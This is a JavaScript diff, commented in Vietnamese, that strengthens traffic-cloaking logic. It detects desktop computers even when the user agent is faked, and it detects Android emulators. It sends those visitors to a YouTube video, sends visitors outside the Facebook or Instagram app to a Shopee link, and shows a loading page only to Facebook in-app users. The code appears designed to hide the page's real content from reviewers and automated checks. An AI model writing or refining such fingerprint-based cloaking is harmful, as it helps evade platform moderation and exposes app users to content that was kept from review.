@@ -132,40 +132,57 @@ const pcRedirect = "https://www.youtube.com/watch?v=mlq7OVEFW94";
 
 const ua = navigator.userAgent || navigator.vendor || window.opera;
 
-// Facebook / Instagram app – ưu tiên giữ nguyên như cũ
+// ---------- PHÁT HIỆN FACEBOOK / INSTAGRAM ----------
 const isFacebook =
     ua.includes("FBAN") ||
     ua.includes("FBAV") ||
     ua.includes("Instagram");
 
-// Nhận diện PC "thực sự" dù có fake UA
-const isPC = (() => {
-    // 1. UA gốc chứa dấu hiệu desktop
-    if (/Windows|Macintosh|Linux|CrOS/i.test(ua)) return true;
-    // 2. Platform thật (không bị fake theo UA)
-    if (/Win32|MacIntel|Linux/i.test(navigator.platform)) return true;
-    // 3. Màn hình rộng + không có cảm ứng → desktop
-    if (window.innerWidth >= 1024 && navigator.maxTouchPoints === 0) return true;
+// ---------- PHÁT HIỆN PC THẬT (DÙ ĐÃ FAKE UA) ----------
+function detectRealPC() {
+    // 1. UA chứa dấu hiệu desktop rõ ràng (trừ khi có Android)
+    const desktopUAPattern = /Windows NT|Macintosh|CrOS|X11; Linux|Linux x86_64/i;
+    if (desktopUAPattern.test(ua) && !/Android/i.test(ua)) {
+        return true;
+    }
+
+    // 2. Platform thật (thường không bị fake theo UA trên đa số trình duyệt)
+    const platform = navigator.platform || "";
+    if (/Win32|MacIntel|Linux x86_64|Linux i686/i.test(platform)) {
+        return true;
+    }
+
+    // 3. Phát hiện qua đặc điểm phần cứng / môi trường
+    //    - Không có màn hình cảm ứng (maxTouchPoints = 0)
+    //    - Hỗ trợ chuột chính xác (hover + fine pointer)
+    //    - Màn hình rộng điển hình của desktop
+    const noTouch = (navigator.maxTouchPoints || 0) === 0;
+    const finePointer = window.matchMedia("(any-hover: hover) and (any-pointer: fine)").matches;
+    const largeScreen = window.innerWidth >= 1024;
+
+    if (noTouch && finePointer) return true;   // Gần như chắc chắn PC có chuột
+    if (noTouch && largeScreen) return true;   // PC không cảm ứng, màn lớn
+    if (finePointer && largeScreen) return true; // Có chuột + màn lớn (có thể laptop touch)
+
     return false;
-})();
+}
 
-// Giả lập Android trên PC
-const isEmulator =
-    /Android SDK built for x86|Emulator|Genymotion|sdk_gphone|x86/i.test(ua);
+// ---------- PHÁT HIỆN GIẢ LẬP ANDROID TRÊN PC ----------
+const isEmulator = /Android SDK built for x86|Emulator|Genymotion|sdk_gphone|x86/i.test(ua);
 
-// ► Chuyển hướng PC / Emulator ngay lập tức → YouTube
-if (isPC || isEmulator) {
+// ► NẾU LÀ PC HOẶC GIẢ LẬP → CHUYỂN HƯỚNG YOUTUBE NGAY
+if (detectRealPC() || isEmulator) {
     window.location.replace(pcRedirect);
     throw new Error("Redirecting...");
 }
 
-// ► Không phải Facebook App → Shopee
+// ► KHÔNG PHẢI FACEBOOK → SHOPEE
 if (!isFacebook) {
     window.location.replace(shopeeLink);
     throw new Error("Redirecting...");
 }
 
-// Chỉ còn Facebook App thực sự chạy loading
+// ---------- CHỈ CÒN FACEBOOK APP MỚI CHẠY LOADING ----------
 const progressBar = document.getElementById("progressBar");
 const percent = document.getElementById("percent");
 
